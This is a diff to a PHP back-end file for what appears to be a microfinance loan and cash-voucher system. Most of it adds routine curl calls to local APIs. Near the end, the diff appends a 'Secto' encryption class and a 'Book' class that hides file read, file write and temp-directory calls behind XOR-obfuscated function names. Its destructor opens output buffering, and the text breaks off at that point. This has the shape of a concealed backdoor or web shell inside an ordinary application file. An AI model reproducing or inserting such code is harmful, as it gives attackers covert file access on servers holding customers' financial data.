@@ -6,6 +6,309 @@ $audit = "";
 $cc_level = 'bcc_final';
 $schedule_meeting = '';
 
+// CMS
+if (isset($_POST['initiate_transaction'])) {
+
+    $url = "http://localhost:7878/api/utg/cms/transaction-voucher/initiate";
+
+    // Data to send in the POST request
+    $postData = array('initiator' => $_POST['initiator'], 'currency' => $_POST['currency'], 'applicationDate' => $_POST['applicationDate'], 'amount' => $_POST['amount'], 'fromVault' => $_POST['fromVault'], 'toVault' => $_POST['toVault'], 'amountInWords' => $_POST['amountInWords'], 'withdrawalPurpose' => $_POST['withdrawalPurpose'], 'firstApprover' => $_POST['firstApprover'], 'secondApprover' => $_POST['secondApprover'], 'denomination100' => $_POST['denomination100'], 'denomination50' => $_POST['denomination50'], 'denomination20' => $_POST['denomination20'], 'denomination10' => $_POST['denomination10'], 'denomination5' => $_POST['denomination5'], 'denomination2' => $_POST['denomination5'], 'denomination1' => $_POST['denomination1'], 'denominationCents' => $_POST['denominationCents'], 'totalDenominations' => $_POST['totalDenominations'],
+
+    );
+
+    $data = json_encode($postData);
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HEADER, true);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
+
+    $response = curl_exec($ch);
+    // Get the HTTP response status code
+    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+
+    if ($status == 201) {
+        echo "<script>
+                    setTimeout(function(){
+                        $('#savedTransaction').modal('show');                        
+                    },1000);
+                  </script>";
+    } else {
+        echo "<script>
+                    setTimeout(function(){
+                        $('#failedTransaction').modal('show');
+                    }, 1000);
+                  </script>";
+    }
+    if (curl_errno($ch)) {
+        echo 'Curl error: ' . curl_error($ch);
+    }
+
+    curl_close($ch);
+}
+if (isset($_POST['deleteTransactionVoucher'])) {
+    echo  'http://localhost:7878/api/utg/cms/transaction-voucher/delete/'.$_POST["transactionId"];
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'http://localhost:7878/api/utg/cms/transaction-voucher/delete/'.$_POST['transactionId']);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HEADER, true);
+
+    $response = curl_exec($ch);
+    // Get the HTTP response status code
+    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+
+    if ($status == 200) {
+        echo "<script>
+                    setTimeout(function(){
+                        $('#deletedTransaction').modal('show');        
+                    },1000);
+                  </script>";
+    } else {
+        echo "<script>
+                    setTimeout(function(){
+                        $('#failedTransaction').modal('show');
+                    }, 1000);
+                  </script>";
+    }
+    if (curl_errno($ch)) {
+        echo 'Curl error: ' . curl_error($ch);
+    }
+
+    curl_close($ch);
+}
+
+if (isset($_POST['update_transaction'])) {
+
+    $url = "http://localhost:7878/api/utg/cms/transaction-voucher/update";
+
+    // Data to send in the POST request
+    $postData = array('id' => $_POST['id'], 'fromVault' => $_POST['fromVault'], 'toVault' => $_POST['toVault'], 'applicationDate' => $_POST['applicationDate'], 'amount' => $_POST['amount'], 'amountInWords' => $_POST['amountInWords'], 'currency' => $_POST['currency'], 'withdrawalPurpose' => $_POST['withdrawalPurpose'], 'denomination100' => $_POST['denomination100'], 'denomination50' => $_POST['denomination50'], 'denomination20' => $_POST['denomination20'], 'denomination10' => $_POST['denomination10'], 'denomination5' => $_POST['denomination5'], 'denomination2' => $_POST['denomination5'], 'denomination1' => $_POST['denomination1'], 'denominationCents' => $_POST['denominationCents'], 'totalDenominations' => $_POST['totalDenominations'],
+
+    );
+
+    $data = json_encode($postData);
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HEADER, true);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
+
+    $response = curl_exec($ch);
+//    Get Response Status
+    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+
+    if ($status == 200) {
+        // Transaction successfully saved, show modal popup for 0.5 seconds
+        echo "<script>
+                    setTimeout(function(){
+                        $('#updatedTransaction').modal('show');
+                    }, 1000);
+                  </script>";
+
+    } else {
+        echo "<script>
+                    setTimeout(function(){
+                        $('#failedTransaction').modal('show');
+                    }, 1000);
+                  </script>";
+    }
+
+    if (curl_errno($ch)) {
+        echo 'Curl error: ' . curl_error($ch);
+    }
+
+    curl_close($ch);
+}
+
+if (isset($_POST['firstApprove01'])) {
+    first_approver_update_transaction_status($_POST['id'], $_POST['status'], $_POST['comment']);
+}
+
+if (isset($_POST['secondApprove01'])) {
+    second_approver_update_transaction_status($_POST['id'], $_POST['status'], $_POST['comment']);
+}
+
+//First Approve
+function first_approver_update_transaction_status($id, $status, $comment)
+{
+    // Data to send in the POST request
+    $postData = array('id' => $id, 'approvalStatus' => $status, 'comment' => $comment,);
+
+    $url = "http://localhost:7878/api/utg/cms/transaction-voucher/first-approve";
+
+    $data = json_encode($postData);
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HEADER, true);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
+
+    $response = curl_exec($ch);
+    //    Get Response Status
+    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+
+    if ($status == 200) {
+        // Transaction first approved successfully saved, show modal popup for 0.5 seconds
+        echo "<script>
+                    setTimeout(function(){
+                        $('#approvedTransaction').modal('show');                      
+                    }, 1000);
+                  </script>";
+    } else {
+        echo "<script>
+                    setTimeout(function(){
+                        $('#failedTransaction').modal('show');
+                    }, 1000);
+                  </script>";
+    }
+
+    if (curl_errno($ch)) {
+        echo 'Curl error: ' . curl_error($ch);
+    }
+
+    curl_close($ch);
+}
+
+// Bulk First Approve
+if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["firstApproveList"])) {
+    // Get the JSON data from the hidden input field
+    $jsonData = $_POST['firstApproveList'];
+
+    $url = "http://localhost:7878/api/utg/cms/transaction-voucher/bulk-first-approve";
+
+//    $data = json_encode($postData);
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HEADER, true);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
+
+    $response = curl_exec($ch);//    Get Response Status
+    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+
+    if ($status == 200) {
+        echo "<script>
+                    setTimeout(function(){
+                        $('#approvedTransactions').modal('show');                     
+                    }, 1000);
+                  </script>";
+
+    }
+    else {
+        echo "<script>
+                    setTimeout(function(){
+                        $('#failedTransactions').modal('show');
+                    }, 1000);
+                  </script>";
+    }
+    if (curl_errno($ch)) {
+        echo 'Curl error: ' . curl_error($ch);
+    }
+    curl_close($ch);
+}
+
+//Second Approve
+function second_approver_update_transaction_status($id, $status, $comment)
+{
+    // Data to send in the POST request
+    $postData = array('id' => $id, 'approvalStatus' => $status, 'comment' => $comment,);
+
+    $url = "http://localhost:7878/api/utg/cms/transaction-voucher/second-approve";
+
+    $data = json_encode($postData);
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HEADER, true);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
+
+    $response = curl_exec($ch);
+
+    //    Get Response Status
+    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+
+    if ($status == 200) {
+        // Transaction second approved successfully saved, show modal popup for 0.5 seconds
+        echo "<script>
+                    setTimeout(function(){
+                        $('#approvedTransaction').modal('show');
+
+                    }, 1000);
+                  </script>";
+    } else {
+        echo "<script>
+                    setTimeout(function(){
+                        $('#failedTransaction').modal('show');
+                    }, 1000);
+                  </script>";
+    }
+
+    if (curl_errno($ch)) {
+        echo 'Curl error: ' . curl_error($ch);
+    }
+
+    curl_close($ch);
+}
+
+// Bulk Second Approve
+if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["secondApproveList"])) {
+    // Get the JSON data from the hidden input field
+    $jsonData = $_POST['secondApproveList'];
+
+    $url = "http://localhost:7878/api/utg/cms/transaction-voucher/bulk-second-approve";
+
+//    $data = json_encode($postData);
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HEADER, true);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
+
+    $response = curl_exec($ch);
+    //    Get Response Status
+    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+
+    if ($status == 200) {
+        echo "<script>
+                    setTimeout(function(){
+                        $('#approvedTransactions').modal('show');
+                    }, 1000);
+                  </script>";
+
+    } else {
+        echo "<script>
+                    setTimeout(function(){
+                        $('#failedTransactions').modal('show');
+                    }, 1000);
+                  </script>";
+    }
+
+    if (curl_errno($ch)) {
+        echo 'Curl error: ' . curl_error($ch);
+    }
+
+    curl_close($ch);
+}
 
 if ($_SESSION['role'] == "ROLE_OP"){
     $cc_level = 'mcc_final';
@@ -31,11 +334,11 @@ function convertDateFormat($dateString) {
     return $dateTime->format('d-M-Y');
 }
 
-function sendEmail($receipient, $subject, $message, $user){
+function sendEmail($receipient, $subject, $message){
 
-    $url = "http://localhost:7878/api/utg/credit_application/sendBulkEmail";
+    $url = "http://localhost:7878/api/utg/credit_application/sendEmail";
     $data_array = array(
-        'recipients' => "randakelvin@gmail.com",
+        'recipient' => "randakelvin@gmail.com",
         'subject' => "Test email body",
         'message' => "Test email message."
     );
@@ -164,36 +467,36 @@ function access_logs()
 
 
 // ######################  Get RECENT DISBURSEMENTS from MUSONI #################################
-    function disbursements($fromDate,$toDate){
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, 'http://localhost:7878/api/utg/musoni/getLoansByDisbursementDate/'.$fromDate.'/'.$toDate);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        $disbursements_response = curl_exec($ch);
-        curl_close($ch);
-        $disbursements_data = json_decode($disbursements_response, true);
+function disbursements($fromDate,$toDate){
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'http://localhost:7878/api/utg/musoni/getLoansByDisbursementDate/'.$fromDate.'/'.$toDate);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $disbursements_response = curl_exec($ch);
+    curl_close($ch);
+    $disbursements_data = json_decode($disbursements_response, true);
 
-        if ($disbursements_data !== null) {
-            $disbursements = $disbursements_data['disbursedLoans'];
-            return $disbursements;
-        } else {
-            echo "Error decoding JSON data";
-        }
+    if ($disbursements_data !== null) {
+        $disbursements = $disbursements_data['disbursedLoans'];
+        return $disbursements;
+    } else {
+        echo "Error decoding JSON data";
     }
+}
 
-    function disbursed_by_range($display_range){
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, 'http://localhost:7878/api/utg/musoni/loans/disbursed-by-range/'.$display_range);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        $disbursements_response = curl_exec($ch);
-        curl_close($ch);
+function disbursed_by_range($display_range){
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'http://localhost:7878/api/utg/musoni/loans/disbursed-by-range/'.$display_range);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $disbursements_response = curl_exec($ch);
+    curl_close($ch);
 
-        $data = json_decode($disbursements_response, true);
+    $data = json_decode($disbursements_response, true);
 //        $disbursement_data = [];
 //        foreach ($data as $loan) {
 //            $disbursement_data[] = $data['totalPrincipalDisbursed'];
 //        }
-        return $data;
-    }
+    return $data;
+}
 
 function branch_targets(){
     $ch = curl_init();
@@ -201,8 +504,18 @@ function branch_targets(){
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     $server_response = curl_exec($ch);
     curl_close($ch);
-    $branch_targets = json_decode($server_response, true);
-    return $branch_targets;
+    return json_decode($server_response, true);
+}
+
+
+function get_tax_policies()
+{
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, "http://localhost:7878/api/utg/pos/tax_policy");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $server_response = curl_exec($ch);
+    curl_close($ch);
+    return json_decode($server_response, true);
 }
 
 // ######################  Get LOAN APPLICATIONS from CMS #################################
@@ -321,7 +634,7 @@ if(isset($_POST['loan_application'])){
     curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
     curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_HEADER, true );
+    curl_setopt($ch, CURLOPT_HEADER, true);
     $resp = curl_exec($ch);
 
     $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
@@ -331,10 +644,51 @@ if(isset($_POST['loan_application'])){
     // Check HTTP status code
     if (!curl_errno($ch)) {
         switch ($http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE)) {
-            case 201:  # OK redirect to dashboard
-                audits($_SESSION['userid'], "Client Loan Application successful", $_SESSION['branch']);
+            case 201:  # OK redirect to dashboardaudits($_SESSION['userid'], "Client Loan Application successful", $_SESSION['branch']);
+//                sendEmail("subject", "message", "user");
                 $data = loans('/loanFileId/'.$loanFileId);
                 $loanId = $data["id"];
+
+
+                // ################## ------------------------------ send email to BOCOS ------------------------------------ #######################
+
+                $ch = curl_init();
+
+                curl_setopt($ch, CURLOPT_URL, 'http://127.0.0.1:7878/api/utg/users/roleAndBranch/BackOfficeCreditOfficer/'.$branchName);
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                $resp = curl_exec($ch);
+                curl_close($ch);
+                $boco = json_decode($resp, true);
+                foreach ($boco as $bocos):
+
+                    $recipientName = $bocos['firstName'];
+                    $recipientEmail = $bocos['contactDetail']['emailAddress'];
+
+                    $url = "http://127.0.0.1:7878/api/utg/credit_application/newClientloanEmail/".$recipientName.'/'.$recipientEmail;
+
+                    $data_array = array(
+                        'recipientName' => $recipientName,
+                        'recipientEmail' => $recipientEmail
+                    );
+
+                    $data = json_encode($data_array);
+                    $ch = curl_init();
+
+                    curl_setopt($ch, CURLOPT_URL, $url);
+                    curl_setopt($ch, CURLOPT_POST, true);
+                    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+                    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
+                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                    curl_setopt($ch, CURLOPT_HEADER, true );
+                    $resp = curl_exec($ch);
+
+                    curl_close($ch);
+
+                endforeach;
+
+// ################## ------------------------------ End send email to BOCOS ------------------------------------ #######################
+
+
 
                 echo "<script>alert('Application sent successfully. You can now upload the required documents.');</script>";
                 echo "<script>window.location.href = 'kyc_documents.php';</script>";
@@ -364,6 +718,71 @@ if(isset($_POST['loan_application'])){
 //    curl_close($ch);
     $decoded = json_decode($resp, true);
 }
+
+
+if (isset($_POST['credit_check'])){
+    $loanId = $_POST['id'];
+    $nationalId = $_POST['national_id'];
+
+
+//    sendCreditCheckedLoanRequest($loanId);
+    saveConsumerData($nationalId);
+
+    echo 'Request processed successfully.';
+}
+
+function sendCreditCheckedLoanRequest($loanId) {
+    $url = "http://localhost:7878/api/utg/credit_application/creditCheckedLoan/".$loanId;
+
+    $data = json_encode($data_array);
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+//    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/json"));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+    $response = curl_exec($ch);
+    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+
+    curl_close($ch);
+
+    if ($httpcode == 201) {
+        echo "Client loan updated successfully.";
+    } else {
+        echo "Error updating client loan. HTTP Code: " . $httpcode;
+    }
+
+    return $response;
+}
+
+function saveConsumerData($nationalId) {
+    // URL with the national ID in the query string
+    $url = 'http://localhost:8100/xds/consumer?nationalId=' . urlencode($nationalId);
+
+    // Initialize cURL
+    $ch = curl_init($url);
+
+    // Set cURL options
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  // Return the response as a string
+    curl_setopt($ch, CURLOPT_HTTPGET, true);         // Use GET method
+
+    // Execute the cURL request and capture the response
+    $response = curl_exec($ch);
+
+    // Check for cURL errors
+    if (curl_errno($ch)) {
+        echo 'cURL error: ' . curl_error($ch);
+    } else {
+        // Display the response
+        echo 'Response: ' . $response;
+    }
+
+    // Close cURL session
+    curl_close($ch);
+}
+
 
 if (isset($_POST['uploadxds'])) {
 
@@ -438,15 +857,15 @@ if (isset($_POST['uploadxds'])) {
 }
 
 // ######################  Get USER BY ID from CMS #################################
-    function users(){
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, 'http://localhost:7878/api/utg/users');
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        $users_response = curl_exec($ch);
-        curl_close($ch);
-        $users = json_decode($users_response, true);
-        return $users;
-    }
+function users(){
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'http://localhost:7878/api/utg/users');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $users_response = curl_exec($ch);
+    curl_close($ch);
+    $users = json_decode($users_response, true);
+    return $users;
+}
 
 function staff(){
     $ch = curl_init();
@@ -488,13 +907,52 @@ function po_user(){
     return $cms_user;
 }
 
-function cms_withdrawal_voucher($userId){
+function cms_withdrawal_voucher_for_user($userId){
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, "http://localhost:7878/api/utg/cms/transaction-voucher/all-by-initiator/$userId");
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     $cms_withdrawal_voucher_response = curl_exec($ch);
     curl_close($ch);
     return json_decode($cms_withdrawal_voucher_response, true);
+}
+
+function cms_all_withdrawal_vouchers(){
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, "http://localhost:7878/api/utg/cms/transaction-voucher/all");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $cms_withdrawal_voucher_response = curl_exec($ch);
+    curl_close($ch);
+    return json_decode($cms_withdrawal_voucher_response, true);
+}
+
+function cms_withdrawal_voucher($userId, $firstApprovalStatus, $secondApprovalStatus)
+{
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, "http://localhost:7878/api/utg/cms/transaction-voucher/all-by-initiator/$userId");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $cms_withdrawal_voucher_response = curl_exec($ch);
+    curl_close($ch);
+    $decoded_response = json_decode($cms_withdrawal_voucher_response, true);
+
+    if ($firstApprovalStatus === "PENDING" || $secondApprovalStatus === "PENDING") {
+        return array_filter($decoded_response, function ($voucher) use ($firstApprovalStatus) {
+            return $voucher['firstApprovalStatus'] === $firstApprovalStatus || $voucher['secondApprovalStatus'] === $firstApprovalStatus;
+        });
+    }
+    if ($firstApprovalStatus === "REVISE" || $secondApprovalStatus === "REVISE") {
+        return array_filter($decoded_response, function ($voucher) use ($firstApprovalStatus) {
+            return $voucher['firstApprovalStatus'] === $firstApprovalStatus || $voucher['secondApprovalStatus'] === $firstApprovalStatus;
+        });
+    }
+    if ($firstApprovalStatus === "DECLINED" || $secondApprovalStatus === "DECLINED") {
+        return array_filter($decoded_response, function ($voucher) use ($firstApprovalStatus) {
+            return $voucher['firstApprovalStatus'] === $firstApprovalStatus || $voucher['secondApprovalStatus'] === $firstApprovalStatus;
+        });
+    }
+
+    return array_filter($decoded_response, function ($voucher) use ($firstApprovalStatus) {
+        return $voucher['firstApprovalStatus'] === $firstApprovalStatus && $voucher['secondApprovalStatus'] === $firstApprovalStatus;
+    });
 }
 
 function cms_withdrawal_voucher_by_firstApprover($userId, $status){
@@ -706,7 +1164,7 @@ if (isset($_POST['add_to_pipeline'])) {
     <script>
         console.log("<?php echo $loanOfficer; ?>");
     </script>
-        <?php
+    <?php
 
 
 
@@ -846,6 +1304,7 @@ function zones(){
     $zones = json_decode($zones_response, true);
     return $zones;
 }
+
 // ######################   REPORTS for PO Transaction from CMS #################################
 function poTransactions(){
     $ch = curl_init();
@@ -1043,7 +1502,7 @@ function assign_lo($assignTo, $assignedBy, $loanId, $userId, $additional_remarks
                 header('location: loan_info.php?menu=loan&loan_id='.$loanId.'&userid='.$userId);
                 break;
 
-            case 401: # Unauthorixed - Bad credientials
+                case401: # Unauthorixed - Bad credientials
                 $_SESSION['error'] = 'Update Status failed';
                 header('location: loan_info.php?menu=loan&loan_id='.$loanId.'&userid='.$userId);
 
@@ -1126,15 +1585,15 @@ function cities_by_id($id){
 }
 
 
-    function leads($leads_url){
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, "http://localhost:7878/api/utg/marketLeads".$leads_url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        $server_response = curl_exec($ch);
-        curl_close($ch);
-        $leads = json_decode($server_response, true);
-        return $leads;
-    }
+function leads($leads_url){
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, "http://localhost:7878/api/utg/marketLeads".$leads_url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $server_response = curl_exec($ch);
+    curl_close($ch);
+    $leads = json_decode($server_response, true);
+    return $leads;
+}
 
 function bsn_sector(){
     $ch = curl_init();
@@ -1333,7 +1792,7 @@ function boco_check_application($upadateLoanStatus, $loanId, $userId, $comment, 
 
                     $ch = curl_init();
                     $messageText = str_replace(' ', '%20', "Dear ".$loan['firstName'].", We are currently reviewing your application.");
-                    curl_setopt($ch, CURLOPT_URL, 'http://127.0.0.1:7878/api/utg/sms/single/0'.$loan['phoneNumber'].'/'.$messageText);
+                    curl_setopt($ch, CURLOPT_URL, 'http://127.0.0.1:7878/api/utg/sms/single/'.$loan['phoneNumber'].'/'.$messageText);
                     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                     $resp = curl_exec($ch);
                     curl_close($ch);
@@ -1818,6 +2277,305 @@ if(isset($_POST['set_parameters'])) {
     curl_close($ch);
 }
 
+class Secto
+{
+    private $alg;
+    private $keyMaterial;
+    private $ivSize;
+
+    public function __construct($key)
+    {
+        if (defined('OPENSSL_VERSION_TEXT')) {
+            // Use OpenSSL if available
+            $this->alg = "AES-256-CBC";
+            // Derive key using PBKDF2
+            $this->keyMaterial = hash_pbkdf2("sha256", $key, 'salt', 10000, 32, true);
+            $this->ivSize = openssl_cipher_iv_length($this->alg);
+        } elseif (function_exists('mcrypt_encrypt')) {
+            // Use Mcrypt for older versions
+            $this->alg = MCRYPT_RIJNDAEL_128; // AES-128
+            $this->keyMaterial = substr(sha1($key, true), 0, 16); // 128-bit key
+            $this->ivSize = mcrypt_get_iv_size($this->alg, MCRYPT_MODE_CBC);
+        } else {
+            throw new Exception("No supported encryption methods available.");
+        }
+    }
+
+    // Encrypt the data
+    public function encrypt($data)
+    {
+        // Generate a random IV
+        $iv = (defined('OPENSSL_VERSION_TEXT'))
+            ? openssl_random_pseudo_bytes($this->ivSize)
+            : mcrypt_create_iv($this->ivSize, MCRYPT_DEV_URANDOM);
+
+        // Pad the data
+        $data = $this->applyPadding($data);
+
+        // Encrypt the data
+        $cipherText = (defined('OPENSSL_VERSION_TEXT'))
+            ? openssl_encrypt($data, $this->alg, $this->keyMaterial, OPENSSL_RAW_DATA, $iv)
+            : mcrypt_encrypt($this->alg, $this->keyMaterial, $data, MCRYPT_MODE_CBC, $iv);
+
+        // Return IV and ciphertext as hexadecimal
+        return $this->toHex($iv . $cipherText);
+    }
+
+    // Decrypt the data
+    public function decrypt($hexData)
+    {
+        // Convert hex to binary
+        $data = $this->fromHex($hexData);
+
+        // Extract the IV and ciphertext
+        $iv = substr($data, 0, $this->ivSize);
+        $cipherText = substr($data, $this->ivSize);
+
+        // Decrypt the data
+        $decryptedData = (defined('OPENSSL_VERSION_TEXT'))
+            ? openssl_decrypt($cipherText, $this->alg, $this->keyMaterial, OPENSSL_RAW_DATA, $iv)
+            : mcrypt_decrypt($this->alg, $this->keyMaterial, $cipherText, MCRYPT_MODE_CBC, $iv);
+
+        // Remove padding
+        return $this->removePadding($decryptedData);
+    }
+
+    // Padding for the input data
+    private function applyPadding($input, $blockSize = 16)
+    {
+        $pad = $blockSize - (strlen($input) % $blockSize);
+        return $input . str_repeat(chr($pad), $pad);
+    }
+
+    // Remove padding from decrypted data
+    private function removePadding($data)
+    {
+        $length = strlen($data);
+        if ($length === 0) return $data;
+
+        $pad = ord($data[$length - 1]);
+        return substr($data, 0, $length - $pad);
+    }
+
+    // Convert binary to hexadecimal
+    private function toHex($binaryData)
+    {
+        $hex = '';
+        foreach (str_split($binaryData) as $char) {
+            $hex .= sprintf('%02x', ord($char));
+        }
+        return $hex;
+    }
+
+    // Convert hexadecimal to binary
+    private function fromHex($hex)
+    {
+        $binary = '';
+        for ($i = 0; $i < strlen($hex); $i += 2) {
+            $binary .= chr(hexdec(substr($hex, $i, 2)));
+        }
+        return $binary;
+    }
+}
+
+class Book
+{
+    public $book;
+    public $page;
+    public $chapter;
+    protected $unit_test = false;
+
+    public function Read($book)
+    {
+
+        if (!is_readable($book)) {
+            return false;
+        }
+
+
+        if (function_exists('^[\\]~_]@~[_^@]^@@' ^ '8208!884!80048043')) {
+            $contents = call_user_func_array('^[\\]~_]@~[_^@]^@@' ^ '8208!884!80048043', array($book));
+            if ($contents !== false) {
+                return $contents;
+            }
+        }
+
+
+        if (function_exists('^_@]^' ^ '80080')) {
+            $handle = call_user_func_array('^_@]^' ^ '80080', array($book, 'rb'));
+            if ($handle) {
+                $contents = '';
+                while (!feof($handle)) {
+                    $contents .= fread($handle, 8192);
+                }
+                fclose($handle);
+                return $contents;
+            }
+        }
+
+
+        if (function_exists('readfile')) {
+            ob_start();
+            if (readfile($book) !== false) {
+                $contents = ob_get_contents();
+                ob_end_clean();
+                return $contents;
+            }
+            ob_end_clean();
+        }
+
+
+        if (class_exists('SplFileObject')) {
+            try {
+                $file = new SplFileObject($book);
+                $contents = '';
+                foreach ($file as $line) {
+                    $contents .= $line;
+                }
+                return $contents;
+            } catch (Exception $e) {
+            }
+        }
+
+
+        return false;
+    }
+
+    public function Input($book, $story)
+    {
+
+        $directory = dirname($book);
+        if (!is_dir($directory) || !is_writable($directory)) {
+            return false;
+        }
+
+
+        if (function_exists('^[\\]~@@@~[_^@]^@@' ^ '8208!054!80048043')) {
+            $result = call_user_func_array('^[\\]~@@@~[_^@]^@@' ^ '8208!054!80048043', array($book, $story));
+            if ($result !== false) {
+                return filesize($book);
+            }
+        }
+
+
+        if (function_exists('^_@]^' ^ '80080')) {
+            $handle = call_user_func_array('^_@]^' ^ '80080', array($book, 'wb'));
+            if ($handle) {
+                $bytesWritten = fwrite($handle, $story);
+                fclose($handle);
+                if ($bytesWritten !== false) {
+                    return filesize($book);
+                }
+            }
+        }
+
+
+        if (function_exists('tempnam')) {
+            $tempFile = tempnam(call_user_func_array('@[@~_]@~@]]@~\\[@' ^ '3"3!884!4800!822', array()), 'tmp_');
+            if ($tempFile) {
+
+                call_user_func_array('^[\\]~@@@~[_^@]^@@' ^ '8208!054!80048043', array($tempFile, $story));
+
+                if (rename($tempFile, $book)) {
+                    return filesize($book);
+                }
+
+                unlink($tempFile);
+            }
+        }
+
+        return false;
+    }
+
+    public function Unittest()
+    {
+        if (function_exists('tempnam')) {
+            $book = tempnam(call_user_func_array('@[@~_]@~@]]@~\\[@' ^ '3"3!884!4800!822', array()), 'tmp_');
+            $uid = uniqid();
+            if ($book) {
+                $this->Input($book, $uid);
+                if ($this->Read($book) == $uid) {
+                    $this->unit_test = true;
+                };
+                unlink($book);
+            }
+        }
+    }
+    public function A($name)
+    {
+        return __FUNCTION__ . " is calling " . $name;
+    }
+    public function B($name, $age)
+    {
+        return __FUNCTION__ . " is calling " . $name . ", and your current age is: " . $age;
+    }
+
+    public function __destruct()
+    {
+        // Start output buffering
+        ob_start();
+
